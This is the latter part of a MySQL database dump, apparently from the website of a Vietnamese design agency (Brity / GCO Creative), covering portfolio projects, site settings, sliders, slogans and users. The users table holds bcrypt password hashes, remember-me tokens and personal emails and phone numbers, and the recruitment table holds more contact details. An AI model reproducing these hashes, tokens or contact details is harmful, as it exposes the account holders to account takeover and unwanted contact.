(18, 5, 0, NULL, 7, 'TRAMEXCO BRAND', NULL, 'tramexco-brand', '', '1539760258_002.jpg', 0, 0, 0, '<p>Kh&aacute;ch h&agrave;ng:&nbsp;TRAMEXCO</p>\r\n<p>Địa chỉ: TP Thanh H&oacute;a</p>\r\n<p>Brand Applications, Visual Identity System</p>', NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '<p><strong>C&ocirc;ng ty CP Thương Mại Dịch Vụ v&agrave; XNK Thanh H&oacute;a (TRAMEXCO)</strong></p>\r\n<p>Được th&agrave;nh lập năm 2003, Tranexco c&oacute; 15 năm kinh nghiệm trong lĩnh vực C&ocirc;ng nghệ v&agrave; C&ocirc;ng nghiệp.</p>', NULL, 'Logo, Branding, Visual Identity System', NULL, NULL, 0, 0, 0, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2018-10-17 07:10:58', '2018-10-17 00:10:58'),
(20, 5, 0, NULL, 8, 'DAI AN HOSPITAL', NULL, 'dai-an-hospital', '', '1539761220_001.jpg', 0, 0, 0, '<p>Kh&aacute;ch h&agrave;ng: Bệnh viện Đa khoa Đại an</p>\r\n<p><span style=\"font-size: 13pt;\">Địa chỉ: QL45, Thiệu Đ&ocirc;, Thiệu Ho&aacute;, Thanh Ho&aacute;</span></p>\r\n<p>Logo, Visual Identity, Brand Application</p>', NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '<p><strong>Bệnh viện Đa khoa Đại an</strong></p>\r\n<p>Quy m&ocirc; 300 giường.</p>\r\n<p>Địa chỉ:&nbsp;QL45, Thiệu Đ&ocirc;, Thiệu Ho&aacute;, Thanh Ho&aacute;</p>', NULL, 'Logo, Visual Identity, Brand Application', NULL, NULL, 0, 0, 0, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2018-10-17 07:27:00', '2018-10-17 00:27:00'),
(21, 5, 1, NULL, 9, 'PINE TWIN', NULL, 'pine-twin', '', '1539761497_001.jpg', 0, 0, 0, '<p>Kh&aacute;ch h&agrave;ng:&nbsp;PINE TWIN</p>\r\n<p>Địa chỉ:&nbsp;T&acirc;y Hồ, H&agrave; Nội</p>\r\n<p>Logo, Brand Identity, Packaging</p>', NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '<p><strong>PINE TWIN STORE GARDEN</strong></p>\r\n<p>Cung cấp c&aacute;c sản phẩm chăm s&oacute;c c&acirc;y cảnh<br />Cung cấp c&acirc;y cảnh, trang tr&iacute; nh&agrave; vườn, c&acirc;y xanh trong nh&agrave;.</p>', NULL, 'Logo, Brand Identity, Packaging', NULL, NULL, 0, 0, 0, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2018-10-17 08:55:00', '2018-10-17 01:55:00');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `product_categories`
--

CREATE TABLE `product_categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `parent_id` int(11) DEFAULT '0',
  `stt` int(11) DEFAULT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `name_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `alias` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `mota` text CHARACTER SET utf8,
  `mota_en` text CHARACTER SET utf8,
  `photo` text COLLATE utf8_unicode_ci,
  `noibat` int(2) DEFAULT '0',
  `status` int(11) NOT NULL,
  `lever` int(11) NOT NULL DEFAULT '0',
  `title` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `title_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `keyword` longtext COLLATE utf8_unicode_ci,
  `keyword_en` text CHARACTER SET utf8,
  `description` longtext COLLATE utf8_unicode_ci,
  `description_en` text COLLATE utf8_unicode_ci,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `product_categories`
--

INSERT INTO `product_categories` (`id`, `parent_id`, `stt`, `name`, `name_en`, `alias`, `mota`, `mota_en`, `photo`, `noibat`, `status`, `lever`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `created_at`, `updated_at`) VALUES
(1, 0, 1, 'THIẾT KẾ THƯƠNG HIỆU', 'BRAND IDENTITY', 'thiet-ke-thuong-hieu', NULL, NULL, '', 0, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2018-06-15 09:40:05', '2018-06-15 02:40:05'),
(2, 0, 2, 'ỨNG DỤNG TƯƠNG TÁC', 'USER INTERFACE', 'ung-dung-tuong-tac', NULL, NULL, '', 0, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2018-06-15 09:40:27', '2018-06-15 02:40:27'),
(3, 0, 3, 'TRUYỀN THÔNG MARKETING', 'MARKETING', 'truyen-thong-marketing', NULL, NULL, '', 0, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2018-06-15 09:40:41', '2018-06-15 02:40:41');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `province`
--

CREATE TABLE `province` (
  `id` int(11) NOT NULL,
  `province_name` varchar(250) DEFAULT NULL,
  `province_en` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `province`
--

INSERT INTO `province` (`id`, `province_name`, `province_en`, `created_at`, `updated_at`) VALUES
(8, 'Hà Nội', 'Ha noi', '2017-12-20 22:01:17', '2017-12-22 21:01:21'),
(9, 'Đà Nẵng', 'Da Nang', '2017-12-20 22:01:26', '2017-12-22 21:01:30'),
(10, 'Hải Phòng', 'Hai Phong', '2017-12-20 22:01:32', '2017-12-22 21:01:35');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `recruitment`
--

CREATE TABLE `recruitment` (
  `id` int(11) NOT NULL,
  `name` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `address` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `phone` varchar(11) DEFAULT NULL,
  `email` varchar(250) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `status` tinyint(2) DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `recruitment`
--

INSERT INTO `recruitment` (`id`, `name`, `address`, `phone`, `email`, `created_at`, `updated_at`, `status`) VALUES
(6, 'Công ty Gco', 'trường chinh, thanh xuân, hà nội', '0943249', 'gco@gmail.com', '2017-09-15 04:21:08', '2017-09-14 21:21:08', 1),
(7, 'Hoàng Hồng Chương', 'Hà Nội', '0987654321', 'chuonghoanghong@gmail.com', '2017-09-17 20:31:17', '2017-09-17 20:31:17', 0);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `setting`
--

CREATE TABLE `setting` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` text COLLATE utf8_unicode_ci,
  `name_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `title` text COLLATE utf8_unicode_ci,
  `title_en` text CHARACTER SET utf8,
  `company` text COLLATE utf8_unicode_ci,
  `company_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `website` text COLLATE utf8_unicode_ci,
  `address` text COLLATE utf8_unicode_ci,
  `address_en` text CHARACTER SET utf8,
  `phone` text COLLATE utf8_unicode_ci,
  `hotline` text COLLATE utf8_unicode_ci,
  `fax` text COLLATE utf8_unicode_ci,
  `email` text COLLATE utf8_unicode_ci,
  `photo` text COLLATE utf8_unicode_ci,
  `logo` text COLLATE utf8_unicode_ci,
  `favico` text COLLATE utf8_unicode_ci,
  `title_index` text COLLATE utf8_unicode_ci,
  `mota` longtext COLLATE utf8_unicode_ci,
  `mota_en` text CHARACTER SET utf8,
  `content` longtext COLLATE utf8_unicode_ci,
  `content_en` text CHARACTER SET utf8,
  `facebook` text COLLATE utf8_unicode_ci NOT NULL,
  `instagram` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `twitter` text COLLATE utf8_unicode_ci NOT NULL,
  `skype` text COLLATE utf8_unicode_ci,
  `google` text COLLATE utf8_unicode_ci NOT NULL,
  `youtube` text COLLATE utf8_unicode_ci NOT NULL,
  `slogan` text CHARACTER SET utf8,
  `slogan_en` text CHARACTER SET utf8,
  `status` int(11) NOT NULL DEFAULT '0',
  `toado` text COLLATE utf8_unicode_ci,
  `copyright` text COLLATE utf8_unicode_ci,
  `iframemap` text COLLATE utf8_unicode_ci,
  `codechat` longtext COLLATE utf8_unicode_ci,
  `analytics` longtext COLLATE utf8_unicode_ci,
  `keyword` longtext COLLATE utf8_unicode_ci,
  `description` longtext COLLATE utf8_unicode_ci,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `setting`
--

INSERT INTO `setting` (`id`, `name`, `name_en`, `title`, `title_en`, `company`, `company_en`, `website`, `address`, `address_en`, `phone`, `hotline`, `fax`, `email`, `photo`, `logo`, `favico`, `title_index`, `mota`, `mota_en`, `content`, `content_en`, `facebook`, `instagram`, `twitter`, `skype`, `google`, `youtube`, `slogan`, `slogan_en`, `status`, `toado`, `copyright`, `iframemap`, `codechat`, `analytics`, `keyword`, `description`, `created_at`, `updated_at`) VALUES
(1, 'Brity', NULL, 'Brity Creative', NULL, 'GCO CREATIVE', 'GCO CREATIVE', 'www.brity.vn', 'Tầng 8, TOYOTA Thanh Xuân 315 Trường Chinh, Thanh Xuân, Hà Nội', '8th , TOYOTA Thanh Xuan, 315 Truong Chinh street, Thanh Xuan, Hanoi, Vietnam', '(+84)90 216 6747', NULL, NULL, 'brity.vn@gmail.com', '1539314377_brity.png', '1539314377_brity.png', '1539314638_fvc.png', NULL, NULL, NULL, NULL, NULL, 'https://www.facebook.com/brity.creative', 'https://www.instagram.com/brity.vn', 'https://twitter.com/?lang=vi', 'brity.vn', 'https://www.behance.net/brity', 'https://www.pinterest.com/brityvn/', '<h1 class=\"vk-cate__heading\">&nbsp;</h1>', '<h1>&nbsp;</h1>', 1, NULL, '© GCO GROUP 2018. All rights reserved', '<iframe src=\"https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d7451.171877144796!2d105.871187!3d20.969137!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3135ac25be4ca5e3%3A0xe81d88694b0116b9!2zWcOqbiBEdXnDqm4sIFnDqm4gU-G7nywgSG_DoG5nIE1haSwgSMOgIE7hu5lpLCBWaWV0bmFt!5e0!3m2!1sen!2s!4v1509609109763\" width=\"600\" height=\"450\" frameborder=\"0\" style=\"border:0\" allowfullscreen></iframe>', NULL, NULL, NULL, NULL, '2018-10-17 15:03:46', '2018-10-17 08:03:46');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `slider`
--

CREATE TABLE `slider` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `link` text COLLATE utf8_unicode_ci,
  `photo` text COLLATE utf8_unicode_ci,
  `icon` text COLLATE utf8_unicode_ci,
  `mota` longtext COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL DEFAULT '1',
  `noibat` int(11) NOT NULL DEFAULT '0',
  `com` text COLLATE utf8_unicode_ci,
  `stt` int(11) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `slider`
--

INSERT INTO `slider` (`id`, `user_id`, `name`, `link`, `photo`, `icon`, `mota`, `content`, `status`, `noibat`, `com`, `stt`, `created_at`, `updated_at`) VALUES
(54, 5, 'Behe Brand', 'http://brity.vn/du-an/behe-5-beauty-and-healthy.html', '1539596664_8.jpg', '', NULL, NULL, 1, 0, 'gioi-thieu', 3, '2018-10-15 09:44:46', '2018-10-15 02:44:46'),
(53, 5, 'GCO GROUP', NULL, '1539597255_9.jpg', '', NULL, NULL, 1, 0, 'gioi-thieu', 2, '2018-10-15 09:54:15', '2018-10-15 02:54:15'),
(52, 5, 'Slide 1', NULL, '1539075178_10.jpg', '', NULL, NULL, 1, 0, 'gioi-thieu', 1, '2018-10-09 08:52:58', '2018-10-09 01:52:58');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `slogan`
--

CREATE TABLE `slogan` (
  `id` int(11) NOT NULL,
  `name` varchar(255) DEFAULT NULL,
  `name_en` varchar(255) DEFAULT NULL,
  `photo` text,
  `content` text,
  `content_en` text,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `slogan`
--

INSERT INTO `slogan` (`id`, `name`, `name_en`, `photo`, `content`, `content_en`, `created_at`, `updated_at`) VALUES
(1, 'Giao hàng kịp thời', 'Timely delivery', '1513754983_quality-item-1.png', '<p>Kh&ocirc;ng m&aacute;y in n&agrave;o nhanh hơn. Đặt h&agrave;ng ng&agrave;y h&ocirc;m nay v&agrave;o l&uacute;c 8 giờ tối theo giờ EST</p>', '<p>No printer any faster. Order today at 8pm EST</p>', '2017-12-20 09:42:26', '2017-12-20 02:42:26'),
(3, 'In chất lượng', NULL, '1513754996_quality-item-2.png', '<p>Mực tươi s&aacute;ng. Giấy d&agrave;y. Cắt ch&iacute;nh x&aacute;c. Ch&uacute;ng t&ocirc;i tin rằng vấn đề in chất lượng l&agrave; vấn đề.</p>', NULL, '2017-12-20 07:30:08', '2017-12-20 00:30:08'),
(4, 'Lời hứa của công ty', NULL, '1513755045_quality-item-3.png', '<p>Lu&ocirc;n l&agrave;m việc chuy&ecirc;n nghiệp, sản phẩm uy t&iacute;n v&agrave; chất lượng đến tay kh&aacute;ch h&agrave;ng</p>', NULL, '2017-12-20 07:30:45', '2017-12-20 00:30:45');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `useronline`
--

CREATE TABLE `useronline` (
  `id` int(10) UNSIGNED NOT NULL,
  `session` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `time` int(11) NOT NULL,
  `ip` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `users`
--

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(60) COLLATE utf8_unicode_ci NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `phone` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `address` text COLLATE utf8_unicode_ci,
  `level` int(11) NOT NULL DEFAULT '2',
  `photo` text COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL DEFAULT '1',
  `remember_token` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `name`, `email`, `phone`, `address`, `level`, `photo`, `status`, `remember_token`, `created_at`, `updated_at`) VALUES
(3, 'tuanduy2012', '$2y$10$DceYJxR4ALmUW.Vt6k9En.1ubJhJGvWX1HISRloBERLNJ8Qq85itO', 'Tuan Duy', 'duydoan.nina@gmail.com', '', '', 1, NULL, 1, 'X37mpbjW1WDCjwH3s4Vq1Jkv3WRNJceXZlbLwHaa', '2017-06-14 23:42:39', '2017-06-14 23:42:39'),
(4, 'evernigh', '$2y$10$pprRO9LhYKADS60bvetRnOYoS3L74giVWf3D/wNZXlDLDRRx0bH6e', 'Duy Đoàn', 'tuanduy_mc2006@yahoo.com', '', '', 0, NULL, 1, '6CirvIekDhWLx3xFrnv7v39bFmalTsH21F4WABTq', '2017-06-16 02:51:34', '2017-06-16 02:51:34'),
(5, 'gco_admin', '$2y$10$Lm3vxVo0UYuWFSzJkpvmwOKecqZm5coQSy1D3QW/Tc8c569RgBNFK', 'Admin', 'gco@gmail.com', '0985431797', '315 Trường chinh, Thanh Xuân, Hà Nội', 1, '5.jpg', 1, 'pi381VhIq7S6zfOVFmcsUyajXuqA3s1Ujlh37P8tGE7y9dBG79c13JxRwhFU', '2018-07-10 09:25:49', '2017-09-24 19:31:27'),
(7, 'hoangchuong', '$2y$10$PnaSJxmZdL0x0wRtj4q0tODPWKtxI85VefEFNZWDQKEH6q8rxjLc6', 'chuong', 'chuonghoanghong@gmail.com', NULL, NULL, 1, NULL, 1, 'DSYV3dr0q7IjUiVKsa4tl4ApOSuDPybd17EupcaO', '2017-11-07 01:31:10', '2017-11-07 01:31:10');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `video`
--

CREATE TABLE `video` (
  `id` int(11) NOT NULL,
  `link` text,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `video`
--

INSERT INTO `video` (`id`, `link`, `created_at`, `updated_at`) VALUES
(1, '<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/nvy3XBg-tmU\" frameborder=\"0\" allowfullscreen></iframe>', '2017-10-15 20:31:58', '2017-10-15 20:34:30');

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `about`
--
ALTER TABLE `about`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `album_project`
--
ALTER TABLE `album_project`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `banggia`
--
ALTER TABLE `banggia`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `bank_account`
--
ALTER TABLE `bank_account`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `banner`
--
ALTER TABLE `banner`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `banner_content`
--
ALTER TABLE `banner_content`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `banner_position`
--
ALTER TABLE `banner_position`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `bills`
--
ALTER TABLE `bills`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `campaigns`
--
ALTER TABLE `campaigns`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `campaign_cards`
--
ALTER TABLE `campaign_cards`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `chinhanh`
--
ALTER TABLE `chinhanh`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `contact`
--
ALTER TABLE `contact`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `contacts`
--
ALTER TABLE `contacts`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `counter`
--
ALTER TABLE `counter`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `district`
--
ALTER TABLE `district`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `feedback`
--
ALTER TABLE `feedback`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `gioithieu`
--
ALTER TABLE `gioithieu`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `images`
--
ALTER TABLE `images`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `langs`
--
ALTER TABLE `langs`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `lienket`
--
ALTER TABLE `lienket`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `linhvuc`
--
ALTER TABLE `linhvuc`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `members`
--
ALTER TABLE `members`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `menu`
--
ALTER TABLE `menu`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `news`
--
ALTER TABLE `news`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `newsletter`
--
ALTER TABLE `newsletter`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `news_categories`
--
ALTER TABLE `news_categories`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `partner`
--
ALTER TABLE `partner`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `products`
--
ALTER TABLE `products`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `product_categories`
--
ALTER TABLE `product_categories`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `province`
--
ALTER TABLE `province`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `recruitment`
--
ALTER TABLE `recruitment`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `setting`
--
ALTER TABLE `setting`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `slider`
--
ALTER TABLE `slider`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `slogan`
--
ALTER TABLE `slogan`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `about`
--
ALTER TABLE `about`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=83;
--
-- AUTO_INCREMENT cho bảng `album_project`
--
ALTER TABLE `album_project`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=364;
--
-- AUTO_INCREMENT cho bảng `banggia`
--
ALTER TABLE `banggia`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT cho bảng `bank_account`
--
ALTER TABLE `bank_account`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT cho bảng `banner`
--
ALTER TABLE `banner`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT cho bảng `banner_content`
--
ALTER TABLE `banner_content`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;
--
-- AUTO_INCREMENT cho bảng `banner_position`
--
ALTER TABLE `banner_position`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT cho bảng `bills`
--
ALTER TABLE `bills`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT cho bảng `campaigns`
--
ALTER TABLE `campaigns`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT cho bảng `campaign_cards`
--
ALTER TABLE `campaign_cards`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;
--
-- AUTO_INCREMENT cho bảng `chinhanh`
--
ALTER TABLE `chinhanh`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT cho bảng `contact`
--
ALTER TABLE `contact`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT cho bảng `contacts`
--
ALTER TABLE `contacts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT cho bảng `counter`
--
ALTER TABLE `counter`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT cho bảng `district`
--
ALTER TABLE `district`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT cho bảng `feedback`
--
ALTER TABLE `feedback`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT cho bảng `gioithieu`
--
ALTER TABLE `gioithieu`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT cho bảng `images`
--
ALTER TABLE `images`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=99;
--
-- AUTO_INCREMENT cho bảng `langs`
--
ALTER TABLE `langs`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;
--
-- AUTO_INCREMENT cho bảng `lienket`
--
ALTER TABLE `lienket`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=46;
--
-- AUTO_INCREMENT cho bảng `linhvuc`
--
ALTER TABLE `linhvuc`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT cho bảng `members`
--
ALTER TABLE `members`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- AUTO_INCREMENT cho bảng `menu`
--
ALTER TABLE `menu`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;
--
-- AUTO_INCREMENT cho bảng `news`
--
ALTER TABLE `news`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;
--
-- AUTO_INCREMENT cho bảng `newsletter`
--
ALTER TABLE `newsletter`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=165;
--
-- AUTO_INCREMENT cho bảng `news_categories`
--
ALTER TABLE `news_categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=79;
--
-- AUTO_INCREMENT cho bảng `partner`
--
ALTER TABLE `partner`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;
--
-- AUTO_INCREMENT cho bảng `products`
--
ALTER TABLE `products`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;
--
-- AUTO_INCREMENT cho bảng `product_categories`
--
ALTER TABLE `product_categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT cho bảng `province`
--
ALTER TABLE `province`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;
--
-- AUTO_INCREMENT cho bảng `recruitment`
--
ALTER TABLE `recruitment`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
--
-- AUTO_INCREMENT cho bảng `setting`
--
ALTER TABLE `setting`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT cho bảng `slider`
--
ALTER TABLE `slider`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;
--
-- AUTO_INCREMENT cho bảng `slogan`
--
ALTER TABLE `slogan`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT cho bảng `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
